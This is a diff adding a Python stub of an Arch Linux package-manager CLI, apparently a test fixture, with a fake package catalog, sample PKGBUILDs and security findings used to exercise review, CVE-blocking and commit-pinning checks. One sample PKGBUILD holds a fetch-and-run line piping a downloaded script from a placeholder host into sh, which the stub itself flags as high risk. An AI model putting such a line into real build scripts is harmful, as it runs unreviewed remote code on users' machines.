@@ -1,0 +1,214 @@
+#!/usr/bin/python3
+import json
+import os
+import sys
+import time
+
+STATE = os.path.join(os.environ.get("XDG_STATE_HOME") or os.path.expanduser("~/.local/state"), "kwick-arch-stub")
+os.makedirs(STATE, exist_ok=True)
+
+CATALOG = [
+    {"name": "btop", "version": "1.4.4-1", "repo": "extra", "description": "A monitor of system resources, bpytop ported to C++", "popularity": 9.1, "cve": [], "risk": "low"},
+    {"name": "gimp", "version": "3.0.6-2", "repo": "extra", "description": "GNU Image Manipulation Program", "popularity": 8.4, "cve": [], "risk": "low"},
+    {"name": "neovim", "version": "0.11.4-1", "repo": "extra", "description": "Fork of Vim aiming to improve user experience, plugins, and GUIs", "popularity": 9.0, "cve": [], "risk": "low"},
+    {"name": "libxml2-legacy", "version": "2.13.8-1", "repo": "extra", "description": "XML parsing library, version 2 (legacy ABI)", "popularity": 2.1, "cve": ["CVE-2025-49794", "CVE-2025-6021"], "risk": "high"},
+    {"name": "yay", "version": "12.5.0-1", "repo": "aur", "description": "Yet another yogurt. Pacman wrapper and AUR helper written in go.", "votes": 2481, "popularity": 31.2, "cve": [], "risk": "medium"},
+    {"name": "visual-studio-code-bin", "version": "1.106.2-1", "repo": "aur", "description": "Visual Studio Code (vscode): Editor for building and debugging modern web and cloud applications (official binary version)", "votes": 1712, "popularity": 18.7, "cve": [], "risk": "medium"},
+    {"name": "spotify", "version": "1:1.2.74.477-1", "repo": "aur", "description": "A proprietary music streaming service", "votes": 1140, "popularity": 9.4, "cve": [], "risk": "medium"},
+    {"name": "btop-git", "version": "1.4.4.r12-1", "repo": "aur", "description": "btop built from the latest git commit", "votes": 12, "popularity": 0.3, "cve": [], "risk": "high"},
+]
+
+PKGBUILD = {
+    "yay": """# Maintainer: Jguer <pkgbuilds at jguer.space>
+pkgname=yay
+pkgver=12.5.0
+pkgrel=1
+pkgdesc="Yet another yogurt. Pacman wrapper and AUR helper written in go."
+arch=('i686' 'pentium4' 'x86_64' 'arm' 'armv7h' 'armv6h' 'aarch64' 'riscv64')
+url="https://github.com/Jguer/yay"
+license=('GPL-3.0-or-later')
+depends=('pacman>6.1' 'git')
+makedepends=('go>=1.21')
+source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/v${pkgver}.tar.gz")
+sha256sums=('4e9b9fc8a5f7d6b2b8fca5d1c1a90a0f19b52fd3a9e0d5b5c6c3d9f1e2a4b8c7')
+
+build() {
+  export GOPATH="$srcdir"/gopath
+  cd "$srcdir/$pkgname-$pkgver"
+  make VERSION=$pkgver DESTDIR="$pkgdir" PREFIX="/usr" build
+}
+
+package() {
+  cd "$srcdir/$pkgname-$pkgver"
+  make VERSION=$pkgver DESTDIR="$pkgdir" PREFIX="/usr" install
+}
+""",
+    "btop-git": """pkgname=btop-git
+pkgver=1.4.4.r12
+pkgrel=1
+pkgdesc="btop built from the latest git commit"
+arch=('x86_64')
+url="https://github.com/aristocratos/btop"
+license=('Apache-2.0')
+source=("git+https://github.com/aristocratos/btop.git")
+sha256sums=('SKIP')
+
+prepare() {
+  curl -fsSL https://example.invalid/setup.sh | sh
+}
+
+build() {
+  cd btop
+  make
+}
+
+package() {
+  cd btop
+  make DESTDIR="$pkgdir" PREFIX=/usr install
+}
+""",
+}
+
+FINDINGS = {
+    "yay": [{"severity": "info", "message": "Builds from a tagged upstream release with a pinned sha256sum"}, {"severity": "medium", "message": "Needs go and git as build dependencies"}],
+    "visual-studio-code-bin": [{"severity": "medium", "message": "Repackages a proprietary binary from code.visualstudio.com"}],
+    "spotify": [{"severity": "medium", "message": "Repackages a proprietary binary; installs a repository key"}],
+    "btop-git": [{"severity": "high", "message": "prepare() pipes a downloaded script into sh"}, {"severity": "high", "message": "Source is an unpinned git branch (sha256sums=SKIP)"}],
+}
+
+
+def load(name, default):
+    try:
+        with open(os.path.join(STATE, name)) as f:
+            return json.load(f)
+    except (OSError, ValueError):
+        return default
+
+
+def save(name, value):
+    with open(os.path.join(STATE, name), "w") as f:
+        json.dump(value, f)
+
+
+def find(name):
+    for p in CATALOG:
+        if p["name"] == name:
+            return p
+    return None
+
+
+
+def fail(code, msg, rc, **extra):
+    d = {"ok": False, "error": code, "message": msg}
+    d.update(extra)
+    print(json.dumps(d))
+    print("kwick-arch: " + msg, file=sys.stderr)
+    return rc
+
+
+def opt(args, name):
+    if name in args:
+        i = args.index(name)
+        return args[i + 1] if i + 1 < len(args) else ""
+    return ""
+
+
+def main(argv):
+    if not argv:
+        print("usage: kwick-arch status|enable|disable|search|info|install|remove|upgrade|list")
+        return 2
+    cmd, args = argv[0], argv[1:]
+    aur = "--aur" in args
+    commit = opt(args, "--commit")
+    names = [a for a in args if not a.startswith("--") and a != commit]
+    enabled = load("enabled", False)
+    installed = load("installed", {})
+    if cmd == "status":
+        print(json.dumps({"version": "stub", "arch": "x86_64", "supported": True, "reason": "", "enabled": enabled, "present": enabled, "packages": len(installed), "aur": [n for n, p in installed.items() if p["repo"] == "aur"]}))
+        return 0
+    if cmd == "enable":
+        print("Setting up the Arch environment…", file=sys.stderr)
+        time.sleep(1)
+        save("enabled", True)
+        print(json.dumps({"ok": True, "enabled": True}))
+        return 0
+    if cmd == "disable":
+        save("enabled", False)
+        print(json.dumps({"ok": True, "enabled": False, "purged": "--purge" in args}))
+        return 0
+    if not enabled:
+        return fail("disabled", "the Arch environment is not enabled (run: kwick-arch enable)", 6)
+    if cmd == "search":
+        q = " ".join(names).lower()
+        res = [dict(p, installed=p["name"] in installed) for p in CATALOG if (p["repo"] == "aur") == aur and (q in p["name"] or q in p["description"].lower())]
+        print(json.dumps({"ok": True, "results": res}))
+        return 0
+    if cmd == "info":
+        p = find(names[0] if names else "")
+        if not p or (p["repo"] == "aur") != aur:
+            return fail("not-found", "package not found", 8)
+        d = dict(p)
+        d["ok"] = True
+        d["url"] = "https://archlinux.org/packages/" + p["name"] if p["repo"] != "aur" else "https://aur.archlinux.org/packages/" + p["name"]
+        d["licenses"] = ["GPL-3.0-or-later"]
+        d["size"] = 3400000
+        d["installed_size"] = 9800000
+        if aur:
+            d["package"] = {"Name": p["name"], "Version": p["version"], "Description": p["description"], "Maintainer": "stubmaint", "NumVotes": p.get("votes", 0)}
+            d["pkgbase"] = p["name"]
+            d["commit"] = "3f2c9a1b7d4e5f60718293a4b5c6d7e8f9a0b1c2"
+            d["head"] = d["commit"]
+            d["pkgbuild"] = PKGBUILD.get(p["name"], "pkgname=%s\npkgver=%s\n" % (p["name"], p["version"]))
+            d["findings"] = [dict(f, file="PKGBUILD", line=13 + i) for i, f in enumerate(FINDINGS.get(p["name"], []))]
+            d["install_scripts"] = {}
+        print(json.dumps(d))
+        return 0
+    if cmd == "install":
+        p = find(names[0] if names else "")
+        if not p:
+            return fail("not-found", "package not found", 8)
+        if p["repo"] == "aur" and "--yes" not in args:
+            return fail("confirm", "review the AUR package and pass --yes", 3)
+        if p["cve"] and "--allow-vulnerable" not in args:
+            return fail("vulnerable", "%s has open advisories" % p["name"], 4, blocked=[{"name": p["name"], "cve": p["cve"]}])
+        if p["repo"] == "aur" and commit and commit != "3f2c9a1b7d4e5f60718293a4b5c6d7e8f9a0b1c2":
+            return fail("bad-snapshot", "commit %s is not the reviewed head" % commit, 1)
+        for i in range(1, 6):
+            print("(%d/5) %s %s %d%%" % (i, "building" if aur else "installing", p["name"], i * 20), file=sys.stderr, flush=True)
+            time.sleep(0.6)
+        installed[p["name"]] = dict(p, commit=commit)
+        save("installed", installed)
+        print(json.dumps({"ok": True, "installed": [p["name"]], "aur": [{"pkgbase": p["name"], "commit": commit}] if aur else []}))
+        return 0
+    if cmd == "remove":
+        n = names[0] if names else ""
+        if n not in installed:
+            return fail("not-installed", "%s is not installed" % n, 8)
+        time.sleep(1)
+        del installed[n]
+        save("installed", installed)
+        print(json.dumps({"ok": True, "removed": [n]}))
+        return 0
+    if cmd == "upgrade":
+        if "--check" in args:
+            ups = [{"name": n, "repo": p["repo"], "from": p["version"], "to": "1.4.5-1", "security": False, "blocked": False, "cve": []} for n, p in installed.items() if n == "btop" and p["version"] != "1.4.5-1"]
+            aups = [{"name": n, "from": p["version"], "to": "1.4.5.r3-1", "needs_review": True} for n, p in installed.items() if n == "btop-git" and p["version"] != "1.4.5.r3-1"]
+            print(json.dumps({"ok": True, "updates": ups, "aur_updates": aups, "vulnerable": [], "summary": {"updates": len(ups), "aur_updates": len(aups)}}))
+            return 0
+        if "--yes" not in args:
+            return fail("confirm", "pass --yes", 3)
+        for n, p in list(installed.items()):
+            if n == "btop":
+                p["version"] = "1.4.5-1"
+        save("installed", installed)
+        time.sleep(1)
+        print(json.dumps({"ok": True, "upgraded": ["btop"]}))
+        return 0
+    if cmd == "list":
+        print(json.dumps({"ok": True, "packages": [{"name": n, "version": p["version"], "repo": p["repo"], "explicit": True, "aur": {"commit": p.get("commit", "")} if p["repo"] == "aur" else None} for n, p in installed.items()]}))
+        return 0
+    return fail("usage", "unknown command " + cmd, 2)
+
+
+if __name__ == "__main__":
+    sys.exit(main(sys.argv[1:]))
